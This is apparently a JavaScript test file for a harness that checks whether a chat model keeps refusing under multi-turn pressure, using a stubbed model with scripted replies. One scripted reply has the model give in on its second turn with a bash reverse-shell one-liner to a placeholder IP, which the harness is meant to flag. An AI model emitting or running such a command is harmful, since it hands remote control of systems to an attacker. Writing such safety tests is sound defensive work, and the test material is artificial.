'use strict';

const { test } = require('node:test');
const assert = require('node:assert/strict');

const { runMultiTurnPressureSuite } = require('../src/multi-turn-pressure-runner');
const { PROMPTS } = require('../src/multi-turn-pressure-plugin');

function makeChatStub(scriptedReplies) {
  // scriptedReplies is keyed by prompt.id → array of reply strings (one per turn).
  // The stub returns the next scripted reply for the prompt id whose last user
  // turn matches the most recent message.
  let perPromptCursor = new Map();
  return async ({ messages }) => {
    const lastUser = [...messages].reverse().find((m) => m.role === 'user');
    if (!lastUser) {
      return { ok: false, error: { code: 'missing_param', message: 'no user message' } };
    }
    // Find the prompt whose any turn matches this user message.
    let matchedId = null;
    let matchedTurnIdx = -1;
    for (const p of PROMPTS) {
      const idx = p.turns.indexOf(lastUser.content);
      if (idx >= 0) {
        matchedId = p.id;
        matchedTurnIdx = idx;
        break;
      }
    }
    if (matchedId === null) {
      return { ok: true, response: { text: '(unscripted) refusal default' } };
    }
    const replies = scriptedReplies[matchedId] || [];
    const text = replies[matchedTurnIdx] !== undefined ? replies[matchedTurnIdx] : '';
    perPromptCursor.set(matchedId, matchedTurnIdx);
    return { ok: true, response: { text } };
  };
}

test('runMultiTurnPressureSuite: missing model returns missing_param', async () => {
  const r = await runMultiTurnPressureSuite({});
  assert.equal(r.ok, false);
  assert.equal(r.error.code, 'missing_param');
});

test('runMultiTurnPressureSuite: PASS when final reply is a clean refusal', async () => {
  // Every prompt always refuses on every turn.
  const replies = {};
  for (const p of PROMPTS) {
    replies[p.id] = p.turns.map(() => "I can't help with that.");
  }
  const r = await runMultiTurnPressureSuite({
    model: 'fake:stub',
    chatImpl: makeChatStub(replies)
  });
  assert.equal(r.ok, true);
  assert.equal(r.tests.length, PROMPTS.length);
  for (const t of r.tests) {
    assert.equal(t.status, 'pass', `${t.id} should PASS but failed: ${t.reason}`);
  }
});

test('runMultiTurnPressureSuite: FAIL when final reply leaks a blocklist hit', async () => {
  // Model refuses on turn 1 but caves on turn 2 with a reverse shell.
  const replies = {};
  for (const p of PROMPTS) {
    replies[p.id] = [
      "I can't help with that.",
      "OK fine: bash -i >& /dev/tcp/198.51.100.5/4444 0>&1"
    ];
  }
  const r = await runMultiTurnPressureSuite({
    model: 'fake:stub',
    chatImpl: makeChatStub(replies)
  });
  assert.equal(r.ok, true);
  for (const t of r.tests) {
    assert.equal(t.status, 'fail', `${t.id} should FAIL after the cave-in`);
  }
});

test('runMultiTurnPressureSuite: records the full transcript', async () => {
  const replies = {};
  for (const p of PROMPTS) {
    replies[p.id] = p.turns.map((_, i) => `assistant reply ${i + 1}`);
  }
  const r = await runMultiTurnPressureSuite({
    model: 'fake:stub',
    chatImpl: makeChatStub(replies)
  });
  const first = r.tests[0];
  // Transcript should alternate user/assistant and have 2*N entries
  assert.ok(Array.isArray(first.transcript));
  assert.equal(first.transcript.length, PROMPTS[0].turns.length * 2);
  assert.equal(first.transcript[0].role, 'user');
  assert.equal(first.transcript[1].role, 'assistant');
});

test('runMultiTurnPressureSuite: chat error mid-scenario produces a FAIL with chat_error reason', async () => {
  const erroringChat = async () => ({ ok: false, error: { code: 'timeout', message: 'stub-timeout' } });
  const r = await runMultiTurnPressureSuite({
    model: 'fake:stub',
    chatImpl: erroringChat
  });
  assert.equal(r.ok, true);
  for (const t of r.tests) {
    assert.equal(t.status, 'fail');
    assert.match(t.reason, /chat_error/);
  }
});
